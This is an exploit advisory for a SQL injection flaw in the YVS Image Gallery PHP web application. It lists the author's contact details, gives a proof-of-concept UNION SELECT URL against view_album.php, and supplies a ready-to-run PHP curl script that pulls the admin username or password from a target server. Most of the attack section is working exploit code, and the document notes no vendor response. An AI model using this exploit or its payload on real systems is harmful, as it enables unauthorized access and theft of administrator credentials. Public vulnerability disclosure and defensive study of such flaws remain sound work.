-=[+] Application: YVS Image Gallery
-=[+] Version: 0.0.0.1
-=[+] Vendor's URL: http://yvs.vacau.com/gallery.html
-=[+] Platform: Windows\Linux\Unix
-=[+] Bug type: Sql INJECTIONS
-=[+] Exploitation: Remote
-=[-]
-=[+] Author: Corrado Liotta Aka CorryL ~ corryl80[at]gmail[dot]com ~
-=[+] Facebook: https://www.facebook.com/CorryL
-=[+] Twitter: https://twitter.com/#!/CorradoLiotta
-=[+] Linkedin: http://it.linkedin.com/pub/corrado-liotta/21/1a8/611
-=[+] +Google: https://plus.google.com/u/0/109396477464303670923

...::[ Descriprion ]::..

This is a small database driven gallery created to be implemented
within your existing site.
The coding is reasonably straight forward and can be easily moved into
your existing development
by anyone with basic understanding of PHP.
Only a first attempt at the system has a long way to go,
but it provides you with all the necessary tools to run your own
picture gallery,
such as uploading of multiple images and creation of thumbnails.
The gallery is distributed as free-ware but if you decide to use it in
any business or just decide that it's worth it,
any donations will be greatly appreciated. details will be made available soon.


...::[ Bug ]::..

exploiting this bug a remote attaker is able' to go up again to user
name and admin password



...::[ Proof Of Concept ]::..

http://Server-Victim/image_gallery/view_album.php?album_id=-1%20UNION%20%20SELECT%20username%20FROM%20user

...::[ Exploit ]::..

#!/usr/bin/php -f
<?php
#
# view_album.php curl exploit
#


// Created by Corrado Liotta Aka CorryL
// For educational only
// use php exploit.php 127.0.0.1 username for admin username o
password for admin password

$target = $argv[1];
$info = $argv[2];

$ch = curl_init();
curl_setopt($ch, CURLOPT_RETURNTRANSFER,1);
curl_setopt($ch, CURLOPT_URL,
"http://$target/image_gallery/view_album.php?album_id=-1%20UNION%20%20SELECT%20$info%20FROM%20user");
curl_setopt($ch, CURLOPT_HTTPGET, 1);
curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/4.0 (compatible; MSIE
5.01; Windows NT 5.0)");
curl_setopt($ch, CURLOPT_TIMEOUT, 3);
curl_setopt($ch, CURLOPT_LOW_SPEED_LIMIT, 3);
curl_setopt($ch, CURLOPT_LOW_SPEED_TIME, 3);
curl_setopt($ch, CURLOPT_COOKIEJAR, "/tmp/cookie_$target");
$buf = curl_exec ($ch);
curl_close($ch);
unset($ch);

echo $buf;
?>

..::[ Disclousure Timeline ]::..

[23/02/2012] - No Vendor Information

-- 
Corrado Liotta? ? ? ?? A.k.a (CorryL)
Email: corryl80@gmail.com
Slype: corrado_liotta
Facebook: http://www.facebook.com/home.php/CorryL
Twitter: https://twitter.com/#!/CorradoLiotta
Linkedin: http://it.linkedin.com/pub/corrado-liotta/21/1a8/611

Specialist in:
Bug Hunting
Security Audits
Penetration Test